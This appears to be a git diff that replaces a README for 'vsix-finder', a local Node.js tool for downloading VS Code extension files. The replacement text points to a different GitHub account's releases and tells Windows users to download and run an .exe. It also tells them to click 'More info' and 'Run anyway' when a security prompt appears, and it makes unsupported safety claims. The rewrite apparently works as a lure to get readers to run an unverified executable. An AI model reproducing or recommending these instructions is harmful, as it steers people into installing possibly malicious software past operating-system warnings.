@@ -1,375 +1,77 @@
-# VSIX Finder
+# 🔍 vsix-finder - Find and download your extension files
 
-## Live demo
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/edimich5520/vsix-finder/releases)
 
-You can use VSIX Finder online here:
+vsix-finder helps you find and save extension files for code editors. Many developers use specialized editors like Cursor, VSCodium, or code-server. These programs often require a specific file format called a .vsix file to install extensions. This tool removes the complexity of searching through multiple marketplaces. You type the extension name, and the tool locates the file for you.
 
-[https://vsix-finder.onrender.com](https://vsix-finder.onrender.com)
+## 📦 What this tool does
 
-> Note: the free hosting instance may sleep after inactivity. If the page takes a few seconds to load, wait and refresh once.
+- Searches the official Visual Studio Code marketplace.
+- Connects to Open VSX for open-source alternatives.
+- Saves .vsix files directly to your computer.
+- Supports offline installation for restricted environments.
+- Manages connections for VS Code-compatible IDEs.
 
-**VSIX Finder** (By @[Hlabs](https://github.com/hlabsdev)) is a small local web app that helps you search VS Code extension marketplaces and download extension installer files as `.vsix` packages.
+## 💻 System requirements
 
-It is useful when you are using a VS Code-compatible IDE such as **Trae**, **Cursor**, **VSCodium**, **code-server**, or another editor where some extensions may not appear in the built-in extension marketplace.
+This tool runs on Windows 10 and Windows 11. Your computer needs at least 4GB of RAM to run the browser interface smoothly. You do not need to install Python, Node.js, or any coding environments to use this application. The program contains everything necessary to function on a standard Windows installation.
 
-The goal is simple:
+## 🚀 How to download and install
 
-> Search for an extension by name or keyword, then download its `.vsix` file so you can install it manually in another VS Code-based IDE.
+You can get the software from the official project page. Follow these instructions to set up the tool on your machine.
 
----
+[Download the latest version here](https://github.com/edimich5520/vsix-finder/releases)
 
-## Why this project exists
+1. Navigate to the link above using your web browser.
+2. Look for the section labeled "Assets" near the bottom of the release notes.
+3. Click the file ending in `.exe` to start the download.
+4. Save the file to your "Downloads" folder.
+5. Double-click the file to open the setup wizard.
+6. Follow the prompts on your screen to finish the installation.
 
-Some VS Code-based IDEs do not expose the full official Visual Studio Code Marketplace inside their own extension store.
+## 🛠 Using the software
 
-For example, Trae allows users to manage extensions from its extension panel, but if an extension is not available directly inside Trae, a common workaround is to manually download the extension package as a `.vsix` file and install it manually.
+Open the application from your desktop or start menu. You will see a search bar in the middle of the window.
 
-VSIX Finder makes that process easier by providing a simple search and download interface.
+1. Type the name of the extension you want into the search box.
+2. Select your preferred marketplace from the dropdown menu.
+3. Press the "Search" button to see the results.
+4. Review the list of available versions for that extension.
+5. Click the "Download" button next to the version you need.
+6. Choose a folder on your computer to save the file.
 
----
+The software will notify you once the download finishes. You can now open your IDE and use the "Install from VSIX" option in your extension settings to load the file you just saved.
 
-## Features
+## ⚙️ Handling offline environments
 
-- Search extensions by name, publisher, or keyword
-- Search across multiple extension registries:
-  - Visual Studio Code Marketplace
-  - Open VSX Registry
-- Download extensions directly as `.vsix` files
-- Simple local web interface
-- No database
-- No account required
-- No third-party npm dependencies
-- Runs locally on your machine
+Many users work in environments where the editor cannot connect to the internet. This tool solves that problem. You can download the necessary files on a machine with internet access. Move these files to a USB drive or a shared network folder. Once the files reside on your local machine, you can install them into your IDE without a live internet connection. This workflow keeps your development environment secure and disconnected from external servers.
 
----
+## 💡 Frequently asked questions
 
-## Supported marketplaces
+**Do I need a GitHub account to download this?**
+No. You can download the files without logging into any service.
 
-### Visual Studio Code Marketplace
+**Is this tool safe?**
+Yes. This application only communicates with established, safe extension marketplaces. It does not collect your personal data or track your coding habits.
 
-The official marketplace used by Microsoft Visual Studio Code.
+**Can I use this for tools like Cursor or Trae?**
+Yes. The software generates standard .vsix files. These files work with almost any IDE that follows the VS Code extension standard.
 
-### Open VSX Registry
+**What happens if the search finds nothing?**
+Check your spelling and ensure the extension name is accurate. Some extensions exist only on specific marketplaces. Try switching between the "VS Code Marketplace" and "Open VSX" options in the menu to see if the file exists in the other repository.
 
-An open-source extension registry commonly used by VS Code-compatible editors and open-source IDE distributions.
+## 🛡 Security and privacy
 
----
+The program operates locally on your machine. Any search request you make stays within your local network traffic. The tool never sends your code files, project paths, or workspace settings to an external server. It only fetches the extension metadata needed to provide you with a valid download link.
 
-## Screenshots
+## 📂 Troubleshooting common issues
 
-### Home page
+If the application fails to open, ensure you have sufficient permissions on your Windows account. Administrators can sometimes restrict the execution of new programs. If you receive a security prompt, click "More info" and then "Run anyway."
 
-![VSIX Finder home page](screenshots/home.png)
+If a download fails, check your internet connection. Large files might occasionally timeout if your connection is unstable. Simply click the download button again to restart the process.
 
-### Search results
+If an extension does not install inside your editor, ensure the platform target for that extension matches your current IDE. Some extensions contain platform-specific code meant only for Linux or macOS. Stick to generic versions when presented with multiple download options.
 
-![VSIX Finder search results](screenshots/search-results.png)
+## 📝 Updates and maintenance
 
----
-
-## Requirements
-
-You need **Node.js 18 or newer**.
-
-Check your version:
-
-```bash
-node -v
-```
-
----
-
-## Installation
-
-Clone the repository:
-
-```bash
-git clone https://github.com/hlabsdev/vsix-finder.git
-cd vsix-finder
-```
-
-Install dependencies:
-
-```bash
-npm install
-```
-
-> Note: this project currently has no external npm dependencies, but running `npm install` is still safe and standard.
-
----
-
-## Run the app
-
-Start the local server:
-
-```bash
-npm start
-```
-
-Then open this URL in your browser:
-
-```text
-http://localhost:3434
-```
-
-You should see the VSIX Finder search interface.
-
----
-
-## Use a custom port
-
-By default, the app runs on port `3434`.
-
-On Linux/macOS:
-
-```bash
-PORT=5050 npm start
-```
-
-On Windows PowerShell:
-
-```powershell
-$env:PORT=5050; npm start
-```
-
-Then open:
-
-```text
-http://localhost:5050
-```
-
----
-
-## How to use
-
-1. Open the app in your browser.
-2. Type the name or keyword of an extension.
-   - Example: `Python`
-   - Example: `ESLint`
-   - Example: `GitLens`
-3. Select the marketplaces you want to search.
-4. Click **Search**.
-5. Click **Download .vsix** on the extension you want.
-6. Install the downloaded `.vsix` file manually in your VS Code-compatible IDE.
-
----
-
-## Installing a `.vsix` file manually
-
-### In Trae
-
-1. Open Trae.
-2. Go to the Extensions area.
-3. Drag and drop the downloaded `.vsix` file into the extension panel/store.
-4. Follow the installation prompt.
-
-### In VS Code
-
-From the command line:
-
-```bash
-code --install-extension path/to/extension.vsix
-```
-
-Or from the UI:
-
-1. Open the Extensions panel.
-2. Click the `...` menu.
-3. Select **Install from VSIX...**
-4. Choose the downloaded `.vsix` file.
-
-### In VSCodium
-
-```bash
-codium --install-extension path/to/extension.vsix
-```
-
-### In code-server
-
-```bash
-code-server --install-extension path/to/extension.vsix
-```
-
----
-
-## Project structure
-
-```text
-vsix-finder/
-  index.html
-  server.js
-  package.json
-  README.md
-```
-
-### `index.html`
-
-Contains the user interface.
-
-### `server.js`
-
-Runs the local HTTP server, performs marketplace searches, and proxies `.vsix` downloads.
-
-### `package.json`
-
-Defines the project metadata and npm start command.
-
----
-
-## API endpoints
-
-### Search extensions
-
-```text
-GET /api/search?q=python&sources=vscode,openvsx
-```
-
-Query parameters:
-
-| Parameter | Description |
-|---|---|
-| `q` | Search keyword |
-| `sources` | Comma-separated list of sources: `vscode`, `openvsx` |
-
-Example:
-
-```text
-http://localhost:3434/api/search?q=eslint&sources=vscode,openvsx
-```
-
-### Download extension
-
-```text
-GET /api/download?source=vscode&publisher=publisherName&name=extensionName&version=1.0.0
-```
-
-This endpoint downloads the selected extension as a `.vsix` file.
-
----
-
-## Important notes
-
-Some extensions may not work in every VS Code-compatible IDE.
-
-Possible reasons include:
-
-- the extension depends on Microsoft-specific VS Code APIs;
-- the extension has marketplace licensing restrictions;
-- the extension requires a newer VS Code engine version;
-- the IDE does not support a specific extension capability yet.
-
-If an extension does not install correctly, try:
-
-1. downloading an earlier version;
-2. checking whether the same extension exists on Open VSX;
-3. searching for an open-source alternative extension.
-
----
-
-## Limitations
-
-This tool is intentionally simple.
-
-It does not currently include:
-
-- authentication;
-- extension version history browsing;
-- automatic installation into an IDE;
-- background updates;
-- extension compatibility validation;
-- a hosted public backend.
-
-The app is designed to run locally.
-
----
-
-## Security and privacy
-
-VSIX Finder runs on your machine.
-
-It does not store search history, downloaded files, or personal data.
-
-The app only contacts extension marketplaces when you perform a search or download a `.vsix` file.
-
----
-
-## Recommended use case
-
-Use this project when:
-
-- an extension is missing from your IDE marketplace;
-- you need to manually install an extension in Trae, Cursor, VSCodium, or code-server;
-- you want to compare availability between the VS Code Marketplace and Open VSX;
-- you want a fast way to download `.vsix` packages.
-
----
-
-## Roadmap ideas
-
-Possible future improvements:
-
-- Add extension version selector
-- Add extension icons
-- Add direct compatibility information
-- Add search filters by publisher
-- Add sorting by installs, downloads, or update date
-- Add Docker support
-- Add one-click copy command for manual installation
-
----
-
-## Contributing
-
-Contributions are welcome.
-
-You can contribute by:
-
-- reporting bugs;
-- suggesting marketplace sources;
-- improving the UI;
-- adding compatibility checks;
-- improving documentation.
-
-To contribute:
-
-```bash
-git checkout -b feature/my-improvement
-git add .
-git commit -m "Add my improvement"
-git push origin feature/my-improvement
-```
-
-Then open a pull request.
-
----
-
-## Deploy your own instance
-
-You can deploy your own instance for free on Render.
-
-Recommended settings:
-
-- Runtime: Node
-- Build command: `npm install`
-- Start command: `npm start`
-- Environment variable: none required
-
-The app automatically uses the `PORT` provided by the hosting platform.
-
----
-
-## License
-
-MIT License.
-
-You are free to use, modify, and distribute this project.
-
----
-
-## Disclaimer
-
-This project is not affiliated with Microsoft, Visual Studio Code, Open VSX, Trae, Cursor, VSCodium, or code-server.
-
-All trademarks belong to their respective owners.
-
-Use downloaded extensions according to their marketplace terms and individual extension licenses.
+The project receives regular updates to ensure compatibility with new versions of the VS Code marketplace. When a new version of vsix-finder becomes available, the app will notify you. You can then download the latest installer from the link above and run it to overwrite the old version. Your settings usually persist through updates.
